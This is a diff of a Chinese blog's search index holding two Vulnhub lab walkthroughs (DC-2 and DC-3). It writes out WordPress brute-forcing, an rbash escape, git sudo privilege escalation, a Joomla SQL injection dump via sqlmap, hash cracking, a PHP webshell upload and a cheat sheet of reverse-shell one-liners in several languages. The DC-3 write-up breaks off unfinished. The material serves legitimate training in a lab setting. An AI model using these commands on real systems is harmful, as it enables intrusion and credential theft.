@@ -178,152 +178,158 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-2渗透学习</title>
-    <url>/2022/06/09/Vulnhub-DC-2/</url>
+    <title>Vulnhub-DC-3渗透学习</title>
+    <url>/2022/06/11/Vulnhub-DC-3/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
 <p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-2：192.168.8.222</p>
-<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
+<p>靶机：Vulnhub-DC-3：192.168.8.180</p>
 </blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>首先使用nmap进行主机探活</p>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/1.png" alt></p>
-<p>然后逐个扫描，判断出靶机的IP地址</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/2.png" alt></p>
-<p>发现我们的目标开放了80和7744端口，80端口是默认端口，7744端口是开放了ssh服务</p>
-<p>使用whatweb继续寻找相关信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/3.png" alt></p>
-<p>然后发现这个网站使用的CMS是WordPress 4.7.10</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首先访问一下80端口，发现flag就在下面</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/4.png" alt></p>
-<p>这里有点奇怪，网上的大部分教程在这一步都会出现域名无法解析的情况，因为在访问这个网址的时候，直接跳转到了<a href="http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪">http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪</a></p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/5.png" alt></p>
-<p>正常流程是需要在本机的hosts文件中加入指向该域名的ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">C:/Windows/System32/drivers/etc/hosts</span><br><span class="line">Linux：</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
-<p>打开hosts文件后加入下面的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.222 dc-2</span><br></pre></td></tr></table></figure>
-<p>再次访问就能够访问成功了，并找到第一个flag</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/6.png" alt></p>
-<p>翻译：</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/1.png" alt></p>
+<p>找到目标IP后继续扫描其开放端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -A -p- 192.168.8.180</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/2.png" alt></p>
+<p>看到它只开放了80端口，同时也扫描到了网站的CMS</p>
+<p>或者我们也可以用whatweb来扫描网站信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.180:80</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/3.png" alt></p>
+<p>再或者我们可以先访问IP的80端口，利用Firefox的插件来找出网站的相关信息</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/4.png" alt></p>
+<p>在网站首页有与一段文字，翻译一下，意思是只有一个flag，只有获得root权限才能找到</p>
 <blockquote>
-<p>您通常的单词表可能不起作用，因此，也许您只需要成为 cewl。</p>
-<p>更多的密码总是更好，但有时你无法赢得所有密码。</p>
-<p>以一个身份登录以查看下一个标志。</p>
-<p>如果找不到，请以另一个身份登录。</p>
+<p>欢迎来到 DC-3。 这一次，只有一个flag，一个入口，没有任何线索。 要获得flag，您显然必须获得 root 权限。 如何成为 root 取决于您 - 显然，取决于系统。 祝你好运 - 我希望你喜欢这个小挑战。 :-)</p>
 </blockquote>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示中提到<strong>cewl</strong>，检索一下发现这是一个生成密码字典的工具，很明显这是让我们用这个工具来生成密码来爆破，可是现在我们还没有用户名。</p>
-<p><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
-<p>信息收集里我们已经知道了这个网站的CMS是WordPress，而Kali中自带有一个专门用来扫描该CMS的工具：wpscan</p>
-<p><a href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用（WordPress扫描工具）</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u //枚举出用户名</span><br><span class="line">注：这里的url必须使用域名，否则无法扫描</span><br></pre></td></tr></table></figure>
-<p>发现一共存在三个用户</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/7.png" alt></p>
-<p>将这三个用户存入txt文件中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/8.png" alt></p>
-<p>然后通过cewl来生成我们的密码字典</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w passwd.txt</span><br><span class="line">注：这里必须使用域名，否则会出错</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/9.png" alt></p>
-<p>那么接下来就是爆破了，但爆破前得找到这个网站的登录入口，有两种方法</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="1、漏洞分析"><a href="#1、漏洞分析" class="headerlink" title="1、漏洞分析"></a>1、漏洞分析</h2><p>首先我们知道它的CMS是<code>Joomla</code>，所以我们就使用专门的扫描工具来对其扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">joomscan --url http://192.168.8.180</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/5.png" alt></p>
+<p>可以看到它扫出了网站的CMS版本信息以及网站的管理员登录入口</p>
+<p>访问一下</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/6.png" alt></p>
+<p>现在我们知道了CMS版本信息，那么就来看看这个版本是否有漏洞吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/7.png" alt></p>
+<p>可以看到找到了一个SQL注入的漏洞，查看一下漏洞信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/8.png" alt></p>
+<p>可以看到里面给出了payload，告诉我们使用sqlmap就可以了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/9.png" alt></p>
+<p>发现了五个数据库，很明显第二个数据库是我们的目标</p>
 <ol>
-<li><p>通过浏览器检索关键信息来寻找</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/10.png" alt></p>
+<li><p>查找数据库<code>joomladb</code>的所有表</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/10.png" alt></p>
 </li>
-<li><p>通过扫描网站后台文件来寻找</p>
-<p>这里理论上可以使用御剑来扫后台，前提是你的字典足够大</p>
-<p>而我这里则推荐使用Kali中的一款web页面扫描工具：<strong>nikto</strong></p>
-<p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.222</span><br><span class="line">nikto -url 192.168.8.222</span><br></pre></td></tr></table></figure>
-<p>扫描完后可以找到该网站的登录页面的地址</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/11.png" alt></p>
+<li><p>查看表<code>#__users</code>的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/11.png" alt></p>
+</li>
+<li><p>查询字段<code>username</code>、<code>password</code>的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.8.180/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump -p list[fullordering]</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/12.png" alt></p>
+<p>成功找到管理员账户密码</p>
 </li>
 </ol>
-<p>两种方法都可以进入登录页面：</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/12.png" alt></p>
-<p>使用wpscan开始爆破</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
-<p>成功爆破出了两个账户密码</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/13.png" alt></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
-<p>尝试登录，进去后就能找到flag2，除此以外就没什么有用的信息了，两个账号的信息是一样的，没必要登录两次</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/14.png" alt></p>
-<p>翻译：</p>
+<p>但这个密码是经过了<code>hash</code>加密，因此我们使用john爆破一下，把密码保存到文件里</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27; &gt; 1.txt</span><br><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/13.png" alt></p>
+<p>因为我之前已经爆破过了，第二次爆破<code>john</code>不会显示出结果，要想显示出结果，就使用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john -show 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/14.png" alt></p>
+<p>成功得到账号/密码</p>
 <blockquote>
-<p>如果您不能利用 WordPress 并走捷径，还有另一种方法。</p>
-<p>希望你找到另一个切入点。</p>
+<p>admin</p>
+<p>snoopy</p>
 </blockquote>
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>提示说我们需要换一个切入点，还记得之前的7744端口吗，这很有可能就是另一个切入点，所以尝试使用刚刚的账号密码登录SSH服务，因为ssh的默认端口是22，因此我们需要在后面加上指定端口，这里在尝试后会发现只有tom账号可以成功登录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh jerry@192.168.8.222 -p 7744</span><br><span class="line">ssh tom@192.168.8.222 -p 7744</span><br></pre></td></tr></table></figure>
-<p>这里如果前提是不知道账号密码的话，可以使用<strong>hydra</strong>进行ssh破解</p>
-<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.222 -L users.txt -P passwd.txt -s 7744 ssh</span><br></pre></td></tr></table></figure>
-<p>这个工具的破解所花的时间比较久，得耐心等会</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/15.png" alt></p>
-<p>然后连接tom账号的ssh服务，成功登录！</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/16.png" alt></p>
-<p>寻找到flag3，但是发现是rbash，就是被限制了的shell</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/17.png" alt></p>
-<p>大致限制情况如下：</p>
+<h2 id="2、登录后台"><a href="#2、登录后台" class="headerlink" title="2、登录后台"></a>2、登录后台</h2><p><img src="/2022/06/11/Vulnhub-DC-3/15.png" alt></p>
+<p>然后就是寻找寻找有没有文件上传点、文件包含点之类的来拿到webshell</p>
+<p>寻找一段时间后发现在<code>Extensions-Templates-Templates</code>里可以新建并上传文件</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/16.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/17.png" alt></p>
+<p>新建一个php文件，然后写入一句话木马</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/18.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/19.png" alt></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/20.png" alt></p>
+<p>保存上传后，接下来就是找到这个文件的路径</p>
+<p>根据这句话大概能猜到这个文件所在的路径，也可以网上找找资料</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/21.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.8.180/templates/beez3/html/shell.php</span><br></pre></td></tr></table></figure>
+<h2 id="3、getshell并反弹shell"><a href="#3、getshell并反弹shell" class="headerlink" title="3、getshell并反弹shell"></a>3、getshell并反弹shell</h2><p>蚁剑连接</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/22.png" alt></p>
+<p>成功得到shell，然后开始反弹shell，反弹shell可以方便我们后面的提权</p>
+<p>kali开启监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/23.png" alt></p>
+<p>接下来就是反弹shell了</p>
+<p>总结一下常见的反弹shell的方法：</p>
 <ol>
-<li>不能通过 cd 来改变工作目录</li>
-<li>不能设置或取消环境变量： SHELL， PATH， ENV， BASH_ENV</li>
-<li>命令名中不能包含目录分隔符 ‘/‘</li>
-<li>不能使用包含有 ‘/‘ 的文件名作为内置命令 ‘.’ 的参数（即文件名中不能有 ‘/‘）</li>
-<li>不能使用 <code>&gt;， &gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt;</code> 等重定向操作符</li>
-<li>不能使用 exec 内置命令</li>
-<li>…</li>
+<li><p><strong>利用netcat反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.8.105 2222 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p>如果<code>nc</code>无法使用<code>-e</code>参数时使用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>利用Bash反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.8.105/2222 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>各种脚本反弹shell</strong></p>
+<ul>
+<li><p><code>Python</code> 脚本反弹shell（当目标主机上有Python环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.105&quot;,2222	));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>php</code>脚本反弹shell（当目标主机上有php环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.8.105&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Perl</code>脚本反弹shell（当目标主机上有Perl环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.8.105&quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>Ruby</code>脚本反弹shell（当目标主机上有Ruby环境）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.8.105&quot;,&quot;2222&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
 </ol>
-<p><a href="http://kuanghy.github.io/2017/02/20/rbash">受限的 bash — rbash </a></p>
-<p>但是我们依然可以使用<code>vi</code>或<code>less</code>命令，所以可以查看到flag3的值</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">less flag3.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/18.png" alt></p>
+<p>因此这里我们尝试使用<code>nc</code>进行反弹</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/24.png" alt></p>
+<p>但是发现目标主机上的<code>nc</code>无法使用<code>-e</code>参数</p>
+<p>因此这个方法行不通，那就使用这个来进行反弹</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.8.105 2222&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/25.png" alt></p>
+<p>成功反弹</p>
+<h2 id="4、提权"><a href="#4、提权" class="headerlink" title="4、提权"></a>4、提权</h2><p>先来尝试一下能不能SUID提权以及有没有可以使用的免密的root权限的文件</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/26.png" alt></p>
+<p>发现并不存在我们可以很好利用的文件</p>
+<p>那就收集一下目标主机的一些信息吧</p>
+<ol>
+<li><p>查看操作系统的版本信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看操作系统的发行版本信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/27.png" alt></p>
+</li>
+</ol>
+<p>得到对应的版本信息</p>
 <blockquote>
-<p>Poor old Tom is always running after Jerry. Perhaps he should <strong>su</strong> for all the stress he causes.</p>
+<p>Linux 4.4.0-21</p>
+<p>Ubuntu 16.04（32-bit）</p>
 </blockquote>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>提示中提到了su，这不难理解，既然rbash使我们的权限受到了限制，那我们就得想办法绕过它，然后通过<code>su jerry</code>切换用户</p>
-<p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p>
-<p>通过vi编辑器进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi //终端上运行vi编辑器</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/19.png" alt></p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/20.png" alt></p>
-<p>然后出来就能看到不是rbash了</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/21.png" alt></p>
-<p>然后再设置一下环境变量</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/22.png" alt></p>
-<p>第一条命令的作用是添加根目录的bin文件夹到$PATH</p>
-<p>第二条命令的作用和上一条一样，添加usr/bin文件夹到$PATH</p>
-<p>里面的冒号只是起分隔作用，并没有其他作用</p>
-<p>这样我们就可以使用这些文件夹中的命令了，接下来就是切换用户了</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/23.png" alt></p>
-<p>切换成功后发现还是在tom的工作目录上，所以更换工作目录，然后就能很快找到flag4</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/24.png" alt></p>
-<blockquote>
-<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
-<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
-<p>No hints here - you’re on your own now.  :-)</p>
-<p>Go on - <strong>git</strong> outta here!!!!</p>
-</blockquote>
-<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>猜测最后一个flag大概率位于root中，所以我们得提权，先来看看SUID提权</p>
-<p>查看具有SUID权限的命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>发现并没有像DC-1的find命令那样可以用来提权</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/25.png" alt></p>
-<p>于是去查看一下具有root权限的命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p>发现存在一个免密的git命令（具有root权限）</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/26.png" alt></p>
-<p>同时flag4中也提示了git，因此用到了git提权</p>
-<p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">2022-渗透测试-git提权（Linux）</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; //在末尾添加</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/27.png" alt></p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/28.png" alt></p>
-<p>成功得到了root权限，进入root就能得到flag</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/29.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_45742511/article/details/114666974">靶机测试—DC（2）</a></p>
-<p><a href="https://blog.csdn.net/qq_61237064/article/details/123500520?spm=1001.2014.3001.5502">dc-2 靶机渗透学习</a></p>
+<p>那么就去寻找看看它是否有漏洞</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/28.png" alt></p>
+<p>可以看到有很多的漏洞，我们该如何选择呢</p>
+<p>通过上面得到的Linux的版本信息和Ubuntu是32位的我们可以排除掉一些，最后只剩下几个</p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/29.png" alt></p>
+<p>然后因为C语言的脚本用起来比较复杂，所以我们优先看看39772.txt这个文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/11/Vulnhub-DC-3/30.png" alt></p>
+<p>里面告诉我们要去Github下载它的压缩包</p>
+<p>然后我们要找到目标主机上可以上传文件的地方，然后用<code>wget</code>进行下载即可，比如tmp目录，这是一个用来存储临时文件的地方，所以我们有权限往里面上传文件</p>
+<p>……….</p>
+<p>出了点小问题，待续</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123546254?spm=1001.2014.3001.5502">dc-3 靶机渗透学习_ZredamanJ的博客-CSDN博客_dc3靶机</a></p>
+<p><a href="https://blog.csdn.net/weixin_45996361/article/details/123054544">Vulnhub靶机：DC-3渗透详细过程_1erkeU的博客-CSDN博客</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1818091">反弹Shell,看这一篇就够了-腾讯云开发者社区-腾讯云</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -480,158 +486,152 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-3渗透学习</title>
-    <url>/2022/06/11/Vulnhub-DC-3/</url>
+    <title>Vulnhub-DC-2渗透学习</title>
+    <url>/2022/06/09/Vulnhub-DC-2/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
 <p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-3：192.168.8.180</p>
+<p>靶机：Vulnhub-DC-2：192.168.8.222</p>
+<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
 </blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>首先使用nmap进行主机探活</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/1.png" alt></p>
-<p>找到目标IP后继续扫描其开放端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -A -p- 192.168.8.180</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/2.png" alt></p>
-<p>看到它只开放了80端口，同时也扫描到了网站的CMS</p>
-<p>或者我们也可以用whatweb来扫描网站信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.180:80</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/3.png" alt></p>
-<p>再或者我们可以先访问IP的80端口，利用Firefox的插件来找出网站的相关信息</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/4.png" alt></p>
-<p>在网站首页有与一段文字，翻译一下，意思是只有一个flag，只有获得root权限才能找到</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/1.png" alt></p>
+<p>然后逐个扫描，判断出靶机的IP地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/2.png" alt></p>
+<p>发现我们的目标开放了80和7744端口，80端口是默认端口，7744端口是开放了ssh服务</p>
+<p>使用whatweb继续寻找相关信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/3.png" alt></p>
+<p>然后发现这个网站使用的CMS是WordPress 4.7.10</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首先访问一下80端口，发现flag就在下面</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/4.png" alt></p>
